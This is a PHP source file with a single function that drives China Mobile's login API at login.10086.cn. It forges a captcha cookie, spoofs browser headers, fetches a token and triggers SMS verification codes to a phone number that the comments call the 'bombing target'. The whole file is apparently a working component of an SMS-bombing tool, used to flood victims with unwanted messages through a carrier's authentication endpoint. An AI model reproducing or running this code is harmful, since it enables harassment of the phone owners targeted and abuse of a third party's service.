<?php
namespace App\Repositories\Destory\Logic;

use App\Helpers\CurlRequest;
use App\Helpers\Token;

class DestoryLogic
{
    /**
     * 中国移动短信下发
     * @return bool
     */
    public static function china_mobile_login($target_mobile)
    {
        $tempstamp    = date('Ymdhis') . Token::rand_str(6, 'number'); // 发送标志
        $captcha_code = Token::rand_str(6, 'string');
        $header       = [
            'Accept:application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding:gzip, deflate, br',
            'Accept-Language:zh-CN,zh;q=0.8',
            'Cache-Control:no-cache',
            'Content-Type:application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie:CaptchaCode=' . $captcha_code . '; sendflag=' . $tempstamp,
            'Host:login.10086.cn',
            'Origin:https://login.10086.cn',
            'Pragma:no-cache',
            'Referer:https://login.10086.cn/html/login/touch.html?channelID=12034&backUrl=http%3A%2F%2Fwww.10086.cn%2Findex%2Fsd%2Findex_531_531.html&tdsourcetag=s_pcqq_aiomsg',
            'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
            'X-Requested-With:XMLHttpRequest',
        ];
        $data = [
            'userName' => $target_mobile, // 轰炸目标手机号
        ];
        // ACTION 1: 检测是否可以下发短信
        $api     = 'https://login.10086.cn/chkNumberAction.action';
        $content = CurlRequest::run($api, http_build_query($data), $header);
        if ('true' == $content) {
            // ACTION 2: 获取下发短信的 token
            $data = [
                'userName' => $target_mobile, // 轰炸目标手机号
            ];
            $api     = 'https://login.10086.cn/loadToken.action';
            $content = CurlRequest::run($api, http_build_query($data), $header);
            $res     = json_decode($content);

            if ('0000' == $res->code) {
                $token = $res->result;
                // ACTION 3: 通过 token 下发短信
                $data = [
                    'userName'  => $target_mobile, // 轰炸目标手机号
                    'type'      => '01',
                    'channelID' => '12034',
                ];
                $api      = 'https://login.10086.cn/sendRandomCodeAction.action';
                $header[] = 'Xa-before:' . $token;
                $content  = CurlRequest::run($api, http_build_query($data), $header);
                if ('0' == $content) {
                    \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.success',
                        compact('target_mobile')
                    );
                } elseif ('2' == $content) {
                    \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.短信下发次数已达上限',
                        compact('target_mobile')
                    );
                } else {
                    \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.Failed',
                        compact('header', 'api', 'data', 'content')
                    );
                }
                return true;
            } else {
                \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.当前手机号暂不能下发短信',
                    compact('api', 'data', 'content')
                );
                return false;
            }
        } else {
            \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.当前手机号暂不能下发短信',
                compact('api', 'data', 'content')
            );
            return false;
        }
    }

}
